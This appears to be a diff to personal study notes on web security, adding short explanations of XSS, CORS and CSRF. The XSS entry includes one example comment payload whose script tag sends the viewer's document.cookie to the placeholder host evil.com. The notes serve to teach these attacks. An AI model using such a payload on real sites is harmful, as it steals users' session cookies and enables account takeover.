@@ -13,3 +13,19 @@
 
 ## XSS (Cross-Site Scripting)
     XSS is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into web pages viewed by other users.
+    {
+      "post_id": 42,
+      "comment": "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
+    }
+
+## CORS (Cross-Origin Resource Sharing)
+    CORS is a browser security feature that controls which domains can access resources (like APIs) from a different domain using JavaScript.
+    It protects your backend API from being accessed by unauthorized frontend sites — but only for JavaScript-based requests.
+    
+
+## CSRF(Cross-Site Request Forgery)
+    - CSRF tricks a user into submitting a request they didn’t intend to, often using their logged-in credentials.
+    - A <form> submission (CSRF attack): browser still sends it — CORS does nothing here.
+    - CORS only applies to cross-origin JavaScript (AJAX/fetch) requests, not to form submissions.
+
+
